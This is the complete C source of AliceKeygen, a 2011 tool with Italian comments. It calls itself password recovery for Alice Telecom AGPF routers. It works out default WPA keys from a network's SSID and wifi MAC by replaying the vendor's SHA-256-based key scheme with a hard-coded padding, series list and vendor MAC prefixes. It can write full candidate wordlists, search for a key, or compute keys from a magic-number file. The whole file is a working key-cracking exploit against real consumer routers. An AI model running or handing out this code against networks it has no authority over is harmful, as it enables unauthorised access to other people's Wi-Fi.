/*
 *  AliceKeygen - Password recovery tool per router Alice Telecom AGPF
 *
 *  Copyright (C) 2011 Gianluca Ghettini
 *  gianluca.ghettini@gmail.com
 *  http://www.gianlucaghettini.net
 *
 *  Algoritmo AGPF originario: White Hat Crew (http://wifiresearchers.wordpress.com)
 *  Codice SHA-256 di Christophe Devine (http://www.aircrack-ng.org)
 * 
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *      
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *      
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 *  MA 02110-1301, USA.
 *
 */
 
#include"alicekeygen.h"

char usageText[] =
"\n"
"  AliceKeygen ver %d.%d - (C) 2011 Gianluca Ghettini\n"
"  Password recovery tool per router Alice Telecom AGPF\n\n"
"  gianluca.ghettini@gmail.com\n"
"  http://www.gianlucaghettini.net\n"
"\n"
"  Utilizzo modo dizionario: alicekeygen -s <ssid> -m <macwifi> -o <file> [opt]\n"
"           modo ricerca:    alicekeygen -s <ssid> -m <macwifi> -w <wpa>  [opt]\n"
"           modo istantaneo: alicekeygen -s <ssid> -m <macwifi> -q <conf> [opt]\n"
"\n"
"  Parametri (obbligatori):\n"
"\n"
"     -s <ssid>    : SSID della rete Alice\n"
"     -m <macwifi> : MAC address wifi del modem Alice\n"
"\n"
"  Selezione modo (obbligatorio):\n"
"\n"
"     -o <file>    : Nome del file dizionario di output (modo dizionario)\n"
"     -w <wpa>     : Chiave wpa da ricercare (modo ricerca)\n"
"     -q <conf>    : Nome del file dei magic number (modo istantaneo)\n"
"\n"
"  Opzioni:\n"
"\n"
"     -b <mbytes>  : Alloca <mbytes> MBbytes per il buffer I/O\n"
"     -x           : Suddivide il file dizionario in tanti file, uno per serie\n"
"     -e <series>  : Utilizza solo la serie <series> (invalida l'opzione -x)\n"
"     -u           : Utilizza solo il MAC address wifi <macwifi>\n"
"     -sl <serial> : Seriale minimo (default = 0)\n"
"     -sh <serial> : Seriale massimo (default = MAX_SERIAL)\n"
"     -r <chars>   : Considera solo i primi <chars> caratteri della chiave <wpa>\n"
"\n"
"  Esempi: \"alicekeygen -s Alice-12345678 -m 00:23:8E:01:02:03 -o out.txt\"\n"
"          \"alicekeygen -s Alice-12345678 -m 00:23:8E:01:02:03 -w 1234abcd1234abcd1234abcd\"\n"
"          \"alicekeygen -s Alice-12345678 -m 00:23:8E:01:02:03 -q agpf_config.txt\"\n"
"\n";

unsigned long int seriesSet[] =
{
    69101,
    67901,     
    69102,
    67902,
    69103,
    67903,
    69104,
    67904,
};


unsigned char vendorMacClassSet[] =
{
    0x00, 0x22, 0x33, 0x00, 0x00, 0x00, /* Pirelli Broadband Solutions */
    0x00, 0x1D, 0x8B, 0x00, 0x00, 0x00,
    0x00, 0x13, 0xC8, 0x00, 0x00, 0x00,
    0x00, 0x17, 0xC2, 0x00, 0x00, 0x00,
    0x00, 0x19, 0x3E, 0x00, 0x00, 0x00,
    0x00, 0x1C, 0xA2, 0x00, 0x00, 0x00,
    0x00, 0x23, 0x8E, 0x00, 0x00, 0x00,
    0x00, 0x25, 0x53, 0x00, 0x00, 0x00,
    0x38, 0x22, 0x9D, 0x00, 0x00, 0x00,

    0x00, 0x0F, 0xA3, 0x00, 0x00, 0x00, /* Alpha network */
    0x00, 0x18, 0x02, 0x00, 0x00, 0x00,
    0x00, 0x1D, 0x6A, 0x00, 0x00, 0x00,
    0x5C, 0x33, 0x8E, 0x00, 0x00, 0x00,

    0x00, 0x26, 0x8D, 0x00, 0x00, 0x00, /* CellTell */
    
    0x00, 0xA0, 0x2F, 0x00, 0x00, 0x00,
    0x00, 0x08, 0x27, 0x00, 0x00, 0x00,
    0x64, 0x87, 0xD7, 0x00, 0x00, 0x00
};

unsigned char charset[] =
{
    '0', '1' ,'2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
    '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
    's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
    'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
    'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
    'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
    '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3'
};

unsigned char fixedPadding[32] =
{
    0x64, 0xC6, 0xDD, 0xE3, 0xE5, 0x79, 0xB6,
    0xD9, 0x86, 0x96, 0x8D, 0x34, 0x45, 0xD2,
    0x3B, 0x15, 0xCA, 0xAF, 0x12, 0x84, 0x02,
    0xAC, 0x56, 0x00, 0x05, 0xCE, 0x20, 0x75,
    0x91, 0x3F, 0xDC, 0xE8
};

/* dati globali */
struct option userOptions; /* opzioni utente */
int lastErr, res;   /* ultimo codice errore e risultato operazione */ 

/* buffers */
unsigned long int *serialsSet;
unsigned char seriesXserial[SERIESXSERIAL_SIZE];
unsigned char macSet[MAX_NUM_MAC][MAC_SIZE];
unsigned char macAddrWifi[MAC_SIZE];
unsigned char macAddrEth[MAC_SIZE];
unsigned char wpa[WPA_SIZE];
unsigned char hash[SHA256_SIZE];
   
/* puntatori per il buffer di scrittura */
unsigned char *bufferStartPtr;
unsigned char *bufferEndPtr;
unsigned char *bufferPtr;

sha256_context *shaCtx; /* context per sha-256 */

FILE* fileHandle; /* file di output */

/* numero totale di seriali, di serie, indirizzi MAC e chiavi wpa */
unsigned long int totalNumOfSerials;
unsigned long int totalNumOfSeries;
unsigned long int totalNumOfMacs;
unsigned long int totalNumOfVendorMacClasses;
unsigned long int totalCycles;

/* stato corrente di generazione delle chiavi */
unsigned long int cycle;
float poc;
unsigned long int series;
unsigned long int serial;

unsigned long int ss, ee;

/* chiave WPA da ricercare */
unsigned char wpaTest[WPA_SIZE];


int getMnSerials(char* fileName)
{
    FILE *fp;
    char line[256];
    char tmp[256];
    int i,j;
    int f,l;
    unsigned long int q, k, serie;
    
    unsigned long int ssid_class_user;
    unsigned long int ssid_class_file;
    
    ssid_class_user = (userOptions.ssid - (userOptions.ssid % 100000)) / 100000;
    
    fp = fopen(fileName, "r");
    if(fp <= 0)
    {
    	lastErr = QK_ERROR;
    	return FAILURE;
    }
    
    totalNumOfSerials = 0;
    totalNumOfSeries = 0;
    
    while(!feof(fp))
    {
    	fgets(line, 256, fp);
    	
    	for(j = 0; j < 256; j++)
    	{
    		if(line[j] == ',') line[j] = 0;
    	}

    	ssid_class_file = atoi(line + 1);
    	
    	if(ssid_class_user == ssid_class_file)
    	{
    		totalNumOfSerials++;
    	}
    }
    
    if(totalNumOfSerials == 0)
    {
    	fclose(fp);
    	lastErr = QK_UNABL;
    	return FAILURE;
    }
	
    fseek(fp, 0, SEEK_SET);
    
    serialsSet = (unsigned long int *)malloc(totalNumOfSerials * sizeof(unsigned long int));
    i = 0;
    
    while(!feof(fp))
    {
       	fgets(line, 256, fp);
    	for(j = 0; j < 256; j++)
    	{
    		if(line[j] == ',') line[j] = 0;
    	}

    	ssid_class_file = atoi(line + 1);
    	serie = atoi(line + 5);
    	k = atoi(line + 11);

    	if(k == 13) q = atoi(line + 14);
		else q = atoi(line + 13);
    	
    	if(ssid_class_user == ssid_class_file)
    	{
    		if(((userOptions.ssid - q) % k) != 0)
    		{
    			fclose(fp);
    			lastErr = QK_INCON;
    			return FAILURE;
    		}
    		serialsSet[i] = (userOptions.ssid - q) / k;
    		if(!isSeriePresent(serie))
    		{
    			seriesSet[totalNumOfSeries++] = serie;
    		}
    		i++;	
    	}
    } 
    
    fclose(fp);
    return SUCCESS;
}

/* libera le risorse (se allocate) */
void freeMemExit()
{
    if(bufferStartPtr != NULL)
    {
        free(bufferStartPtr);
    }
    if(serialsSet != NULL)
    {
        free(serialsSet);
    }
    if(shaCtx != NULL)
    {
        free(shaCtx);
    }
    printf("\n\n");
    exit(SUCCESS);
}

/* controlla se i primi <userOptions.wpaChars> caratteri della chiave wpa di
   test coincidono con la chiave wpa generata */
int isWpaCorrect()
{   
	int i;
	
    for(i = 0; i < userOptions.wpaChars; i++)
    {
        if(wpa[i] != wpaTest[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

/* mac0 e mac1 sono uguali? */
int isMacEqual(unsigned char *mac0, unsigned char *mac1)
{
    int i;
	
    for(i = 0; i < MAC_SIZE; i++)
    {
        if(mac0[i] != mac1[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

/* serie e' gia' presente nella lista seriesSet? */
int isSeriePresent(unsigned long int serie)
{
    int i;
    
    for(i = 0; i < totalNumOfSeries; i++)
    {
        if(serie == seriesSet[i])
        {
            return TRUE;
        }
    }
    return FALSE;
}


/* mac e' gia' presente nella lista macSet? */
int isMacPresent(unsigned char *mac)
{
    int i;
    
    for(i = 0; i < totalNumOfMacs; i++)
    {
        if(isMacEqual(mac, macSet[i]) == TRUE)
        {
            return TRUE;
        }
    }
    return FALSE;
}

/* aggiunge macAddr alla lista degli indirzzi MAC da utilizzare */
void addMacAddr(int index, unsigned char* macAddr)
{
    int i;
    
    for(i = 0; i < MAC_SIZE; i++)
    {
        macSet[index][i] = macAddr[i];
    }
}

/* stampa a video lo stato attuale di avanzamento */
void printProgress()
{
	int i;
	
    poc = ( (float)cycle / (float)totalCycles) * 100;
    if(userOptions.opMode == GENFILE)
    {
        printf("\rCreazione dizionario in corso... %2.2f%%", poc);
    }
    else if(userOptions.opMode == FINDKEY)
    {
        printf("\rRicerca chiave in corso... ");
        printf("[");
        for(i = 0; i < userOptions.wpaChars; i++) printf("%c", wpa[i]);
        for(i = userOptions.wpaChars; i < WPA_SIZE; i++) printf(".");            
        printf("] %2.2f%%", poc); 
    }
}

/* scrive il buffer sul file di output */
int flushBuffer()
{
    unsigned long int bytesWritten;
    
    bytesWritten = fwrite(bufferStartPtr, 1, bufferPtr - bufferStartPtr, fileHandle);
    if(bytesWritten != (bufferPtr - bufferStartPtr))
    {
        return FAILURE;
    }
    bufferPtr = bufferStartPtr;
    return SUCCESS;
}

/* scrive la chiave wpa corrente sul buffer */
int writeWpaToBuffer()
{
    if((bufferEndPtr - bufferPtr) < (userOptions.wpaChars + CRLF_SIZE)) /* buffer pieno! */
    {
        if(flushBuffer() == FAILURE) /* scrivi su disco e svuota il buffer */
        {
            lastErr = FILE_ERR;
            return FAILURE;
        }
    }

    memcpy(bufferPtr, wpa, userOptions.wpaChars);
    bufferPtr += userOptions.wpaChars;
    *bufferPtr++ = CR;
    *bufferPtr++ = LF;
        
    return SUCCESS;
}

/* genera tutte le chiavi wpa possibili per ssid-series-macAddr specificati */
int generateKeys(unsigned long int ssid, unsigned long int series, unsigned char *macAddr)
{ 
	int i,j;
	
	if(userOptions.opMode == QK_MODE)
	{
		for(j = 0; j < totalNumOfSerials; j++) /* per ogni serial... */
    	{
        	sprintf(seriesXserial, "%05dX%07d", series, serialsSet[j]); /* crea la stringa serie-X-seriale */
            
        	/* calcola l'hash SHA256(fixedPadding + serie-X-seriale + MAC) */
        	sha256_starts(shaCtx); 
        	sha256_update(shaCtx, fixedPadding, sizeof(fixedPadding));
        	sha256_update(shaCtx, seriesXserial, SERIESXSERIAL_SIZE);
        	sha256_update(shaCtx, macAddr, MAC_SIZE);
        	sha256_finish(shaCtx, hash);
            
        	/* converte l'hash in caratteri ASCII */
        	for(i = 0; i < WPA_SIZE; i++) wpa[i] = charset[hash[i]];

        	printf("\n");
        	for(i = 0; i < userOptions.wpaChars; i++) printf("%c", wpa[i]);
        	for(i = userOptions.wpaChars; i < WPA_SIZE; i++) printf(".");
    	}
	}
	else
	{
    	for(serial = userOptions.startSerial; serial < userOptions.endSerial; serial++) /* per ogni serial... */
    	{
    		if(cycle % PRINT_RATE == 0)
        	{
        		printProgress();
        	}
        
        	sprintf(seriesXserial, "%05dX%07d", series, serial); /* crea la stringa serie-X-seriale */
            
        	/* calcola l'hash SHA256(fixedPadding + serie-X-seriale + MAC) */
        	sha256_starts(shaCtx); 
        	sha256_update(shaCtx, fixedPadding, sizeof(fixedPadding));
        	sha256_update(shaCtx, seriesXserial, SERIESXSERIAL_SIZE);
        	sha256_update(shaCtx, macAddr, MAC_SIZE);
        	sha256_finish(shaCtx, hash);
            
        	/* converte l'hash in caratteri ASCII */
        	for(i = 0; i < WPA_SIZE; i++) wpa[i] = charset[hash[i]];

        	if(userOptions.opMode == FINDKEY) /* stiamo cercando una chiave particolare */
        	{
            	if(isWpaCorrect() == TRUE)
            	{
                	return KEYFOUND;
            	}
        	}
        	else if(userOptions.opMode == GENFILE) /* stiamo generando il dizionario */
        	{
            	if(writeWpaToBuffer() == FAILURE)
            	{
                	lastErr = FILE_ERR;
                	return FAILURE;
            	}
        	}
        	cycle++;
    	}
    }
    
    return SUCCESS;
}

/* calcola il MAC della scheda ethernet */
int computeMacEth012(unsigned char *macAddrEth, char *macAddrTest, unsigned long int ssid)
{
    unsigned long int ssid0, ssid1, ssid2;
    
    ssid0 = ssid;
    ssid1 = ssid + 100000000;
    ssid2 = ssid + 200000000;
    
    macAddrEth[0] = macAddrTest[0];
    macAddrEth[1] = macAddrTest[1];
    macAddrEth[2] = macAddrTest[2];
    
    if(((ssid0 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid0 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid0 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid0 & 0x0000FF;
    }

    else if(((ssid1 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid1 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid1 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid1 & 0x0000FF;
    }    

    else if(((ssid2 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid2 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid2 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid2 & 0x0000FF;
    }
    else
    {
        macAddrEth[3] = 0;
        macAddrEth[4] = 0;
        macAddrEth[5] = 0;
        return FAILURE;
    }
    return SUCCESS;
}

/* inizializza le risorse */
int initMem()
{
    bufferPtr = NULL;
    if(userOptions.opMode == GENFILE) /* generiamo il file dizionario? */
    {
        /* si, alloca il buffer di scrittura e inizializza i puntatori */
        bufferStartPtr = (char *)malloc(userOptions.bufferSize * 1048576 * sizeof(char));
        if(bufferStartPtr == NULL)
        {
            lastErr = MEM_ERR;
            return FAILURE;
        }
        bufferPtr = bufferStartPtr;
        bufferEndPtr = bufferStartPtr + (userOptions.bufferSize * 1048576 * sizeof(unsigned char));
    }
    
    /* alloca il context per SHA-256 */
    shaCtx = NULL;
    shaCtx = (sha256_context*)malloc(1 * sizeof(sha256_context));
    if(shaCtx == NULL)
    {
        lastErr = MEM_ERR;
        return FAILURE;
    }
    
    serialsSet = NULL;
    
    return SUCCESS;
}

/* inizializzazione dei parametri */
int initPar()
{
    cycle = 0;     

    lastErr = SUCCESS;
    poc = 0;
    int i;

    /* generazione di tutti gli indirizzi MAC da utilizzare */
    totalNumOfMacs = 0;
    addMacAddr(totalNumOfMacs++, macAddrWifi);
    
    if(userOptions.oneMac == FALSE)
    { 
    	if(computeMacEth012(macAddrEth, macAddrWifi, userOptions.ssid) == SUCCESS)
    	{
        	if(!isMacPresent(macAddrEth))
        	{
           		addMacAddr(totalNumOfMacs++, macAddrEth);
        	}
    	}
    
    	totalNumOfVendorMacClasses = sizeof(vendorMacClassSet) / sizeof(char) / MAC_SIZE;
    	for(i = 0; i < totalNumOfVendorMacClasses; i++)
    	{   
        	if(computeMacEth012(macAddrEth, vendorMacClassSet + (i * MAC_SIZE), userOptions.ssid) == SUCCESS)
        	{
            	if(isMacPresent(macAddrEth) == FALSE)
            	{
                	addMacAddr(totalNumOfMacs++, macAddrEth);
            	}      
        	}
    	}
    }
    
    if(userOptions.series > 0) /* l'utente ha specificato una serie? */
    {
        /* si, considera solo la serie specificata */
        totalNumOfSeries = 1;
		seriesSet[0] = userOptions.series;
    }
    else
    {
        /* no, considerale tutte */
        totalNumOfSeries = sizeof(seriesSet) / sizeof(unsigned long int);
    }
    
    totalNumOfSerials = (userOptions.endSerial - userOptions.startSerial);
    
    return SUCCESS;  
}

/* inizializza le opzioni utente a valori di default */
void initOptions()
{
    userOptions.ssid = 0;
    userOptions.macAddrWifi = NULL;
    userOptions.file = NULL;
    userOptions.bufferSize = DEFAULT_BUFFER_SIZE_MB;
    userOptions.series = 0;
    userOptions.startSerial = 0;
    userOptions.endSerial = MAX_SERIAL;   
    userOptions.opMode = NONE;
    userOptions.splitDict = FALSE;    
    userOptions.oneMac = FALSE;
    userOptions.wpaChars = WPA_SIZE;
}

/* converte un indirizzo MAC da stringa a byte[6] */
int str2mac(unsigned char* str, unsigned char* mac)
{
    int a[MAC_SIZE];
    int i;
    
    if(sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x", &a[5], &a[4], &a[3], &a[2], &a[1], &a[0]) != MAC_SIZE)
    {
        return FAILURE;
    }

	for(i = 0; i < MAC_SIZE; i++)
	{
		mac[i] = a[MAC_SIZE - i - 1];
	}

    return SUCCESS;
}

/* loop principale di generazione delle chiavi */
int coreLoop()
{   
    res = SUCCESS;
    
	fileHandle = 0;
	unsigned char splitFileName[1024];
	
    if(userOptions.splitDict == FALSE && userOptions.file != NULL)
    {
        fileHandle = fopen(userOptions.file, "wb");
    }    

    for(ss = 0; ss < totalNumOfSeries && res == SUCCESS; ss++)
    {
        if(userOptions.splitDict == TRUE && userOptions.file != NULL)
        {
        	flushBuffer();
        	if(fileHandle > 0) fclose(fileHandle);
        	sprintf(splitFileName, "%05d_", seriesSet[ss]);
        	fileHandle = fopen(strcat(splitFileName, userOptions.file), "wb");
        }    
    
        for(ee = 0; ee < totalNumOfMacs && res == SUCCESS; ee++)
        {
            res = generateKeys(userOptions.ssid, seriesSet[ss], macSet[ee]);
        }
    }
    
    if(userOptions.file != NULL) flushBuffer();
    if(fileHandle > 0) fclose(fileHandle);
    printProgress();
    
    return res;
}


int main(int argc, char *argv[])
{   
    int err = FALSE;
	int i;
	
    initOptions();
    
    /* parsing e validazione di tutti i parametri inseriti */
    for(i = 1; i < argc && err == FALSE; i++)
    {
        if(strcmp(argv[i], "-s") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: SSID non specificato");
                err = TRUE;
            }
            else
            {
                if(strncmp(argv[i],"Alice-",6) != 0)
                {
                    printf("\nErrore: SSID invalido %d", argv[i]);
                    err = TRUE;                   
                }
                else
                {
                	userOptions.ssid = atoi(argv[i] + 6);
                }
            }
        }
        else if(strcmp(argv[i], "-m") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: MAC address non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.macAddrWifi = argv[i];
                if(strlen(userOptions.macAddrWifi) != 17 || str2mac(userOptions.macAddrWifi, macAddrWifi) == FAILURE)
                {
                    printf("\nErrore: Mac address invalido");
                    err = TRUE;                       
                }
            }
        }
        else if(strcmp(argv[i], "-o") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: file di output non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.file = argv[i];
                userOptions.opMode = GENFILE;
            }
        }
        else if(strcmp(argv[i], "-q") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: file MN non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.fileMN = argv[i];
                userOptions.opMode = QK_MODE;
            }
        }
        else if(strcmp(argv[i], "-b") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: parametro b non specificato");
                err = TRUE;
            }
            else
            {
                if(atoi(argv[i]) <= 0)
                {
                    printf("\nErrore: parametro b invalido");
                    err = TRUE;
                }
                else
                {
                    userOptions.bufferSize = atoi(argv[i]);
                }
            }
        }
        else if(strcmp(argv[i], "-e") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: parametro e non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.series = atoi(argv[i]);
                if(userOptions.series <= 0 || userOptions.series >= 100000)
                {
                    printf("\nErrore: parametro e invalido");
                    err = TRUE;
                }
            }
        }
        else if(strcmp(argv[i], "-u") == 0)
        {
        	userOptions.oneMac = TRUE;
        }
        else if(strcmp(argv[i], "-x") == 0)
        {
        	userOptions.splitDict = TRUE;
        }
        else if(strcmp(argv[i], "-w") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: chiave WPA non specificata");
                err = TRUE;
            }
            else
            {
				strcpy(wpaTest, argv[i]);
				userOptions.opMode = FINDKEY;
            }
        }
        else if(strcmp(argv[i], "-r") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: numero di caratteri per chiave WPA non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.wpaChars = atoi(argv[i]);
                if(userOptions.wpaChars <= 0 || userOptions.wpaChars > WPA_SIZE)
                {
                    printf("\nErrore: parametro r invalido");
                    err = TRUE;
                }      
            }
        }
        else if(strcmp(argv[i], "-sl") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: seriale minimo non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.startSerial = atoi(argv[i]);
                if(userOptions.startSerial < 0 || userOptions.startSerial > MAX_SERIAL)
                {
                    printf("\nErrore: seriale minimo invalido %d", userOptions.startSerial);
                    err = TRUE;                   
                }
            }
        }        
        else if(strcmp(argv[i], "-sh") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: seriale massimo non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.endSerial = atoi(argv[i]) + 1; /* +1 perche' usiamo ovunque guardie if con i minore secco */
                if(userOptions.endSerial < 0 || userOptions.endSerial > MAX_SERIAL)
                {
                    printf("\nErrore: seriale massimo invalido %d", userOptions.endSerial);
                    err = TRUE;                   
                }
            }
        }
        else
        {
            printf("\nOpzione non valida: %s", argv[i]);
            err = TRUE;
        } 
    }
    if(argc == 1) /* nessun parametro e' stato inserito */
    {
        printf(usageText, MJR_VER, MIN_VER);
        exit(SUCCESS);
    }
	
	/* validazione input preliminare */
	if(userOptions.ssid == 0) /* manca l'SSID? */
    {
        printf("\nErrore: SSID della rete Alice non specificato");
        err = TRUE;
    }
    if(userOptions.macAddrWifi == NULL) /* manca il MAC address wifi? */
    {
        printf("\nErrore: MAC address wifi del modem Alice non specificato");
		err = TRUE;
    }
    if(userOptions.opMode == NONE) /* non e' stato specificato ne un file di output, ne un file MN, ne una chiave wpa */
    {
        printf("\nErrore: specificare un file di output, o un file MN, o una chiave wpa");
        err = TRUE;
    }
    if(userOptions.startSerial > userOptions.endSerial + 1)
    {
        printf("\nErrore: seriale minimo maggiore di quello massimo");
        err = TRUE;
    }
	if(strlen(wpaTest) != WPA_SIZE && strlen(wpaTest) != userOptions.wpaChars && userOptions.opMode == FINDKEY)
	{
		printf("\nErrore: lunghezza chiave WPA non valida");
		err = TRUE;                   
	}
	
    if(err == TRUE) /* sono stati inseriti parametri sbagliati */
    {
		printf("\n\n\n");
		exit(SUCCESS);
    }
    
    printf("\nSSID: Alice-%08d", userOptions.ssid);
    printf("\nMAC WiFi: %s", userOptions.macAddrWifi);
    
    printf("\ninitMem()...");
    if(initMem() == FAILURE)
    {
        printf("Errore: ");
        if(lastErr == MEM_ERR) printf("Memoria insufficiente."); 
        else if(lastErr == FILE_EXS) printf("File esistente.");
        else if(lastErr == FILE_ERR) printf("Impossibile creare il file. Disco sola lettura o errore disco.");
        else printf("?");
        freeMemExit();
    }
    else
    {
        printf("Ok");
    }

    printf("\ninitPar()...");
    if(initPar() == FAILURE)
    {
        printf("Errore: ");
        printf("?");
        freeMemExit();
    }
    else
    {
        printf("Ok");
    }
        
    if(userOptions.opMode == QK_MODE)
    {
    	printf("\ngetMnSerials()...");
    	if(getMnSerials(userOptions.fileMN) == FAILURE)
    	{
    		if(lastErr == QK_ERROR) printf("File MN mancante o corrotto.");
    	    else if(lastErr == QK_UNABL || lastErr == QK_INCON) printf("Il file MN non supporta la rete Alice specificata.");
    	    else printf("?");
    	 	freeMemExit();
    	}
    	else
    	{
        	printf("Ok");
    	}
    }
    
    /* calcola il numero di chiavi totali da generare */
    totalCycles = 0;
    totalCycles += totalNumOfSerials;
    totalCycles *= totalNumOfMacs;
    totalCycles *= totalNumOfSeries;
    
    printf("\nSeriali totali: %d", totalNumOfSerials);
   	if(userOptions.opMode == GENFILE)
    {
        printf("\nDimensione buffer I/O: %d MB", userOptions.bufferSize); 
        printf("\nDimensione file wordlist: %d Bytes (%2.1f MB)", (totalCycles * (userOptions.wpaChars + CRLF_SIZE)), (float)(totalCycles * (userOptions.wpaChars + CRLF_SIZE)) / 1048576);
    }
    printf("\nSerie totali: %d", totalNumOfSeries);
    printf("\nMAC totali: %d", totalNumOfMacs);
	printf("\nSerie:");
    for(i = 0; i < totalNumOfSeries; i++)
    {
        printf("\n(%d) %05d", i, seriesSet[i]);       
    }
    printf("\nIndirizzi MAC:");
    for(i = 0; i < totalNumOfMacs; i++)
    {
        printf("\n(%d) %02X:%02X:%02X:%02X:%02X:%02X", i, macSet[i][0], macSet[i][1], macSet[i][2], macSet[i][3], macSet[i][4], macSet[i][5]);       
    }
    
    printf("\nChiavi totali: %d", totalCycles);
    printf("\n");
    
    res = coreLoop(); /* genera tutte le chiavi wpa */
    
    if(userOptions.opMode == GENFILE)
    {
        printf("\nGenerazione dizionario completata.");  
    }
    else if(userOptions.opMode == FINDKEY)
    {
        if(res == KEYFOUND)
        {
            printf("\n\n\nCHIAVE TROVATA! ");
            printf("[");
            for(i = 0; i < WPA_SIZE; i++) printf("%c", wpa[i]);           
            printf("]");
            printf("\nSeriale: %07d", serial);
            printf("\nSerie: %05d", seriesSet[ss - 1]);
            printf("\nMAC: %02X:%02X:%02X:%02X:%02X:%02X", macSet[ee - 1][0], macSet[ee - 1][1], macSet[ee - 1][2], macSet[ee - 1][3], macSet[ee - 1][4], macSet[ee - 1][5]); 
        }
        else
        {
            printf("\nChiave non trovata.");
        }
    }
    
    freeMemExit();
}
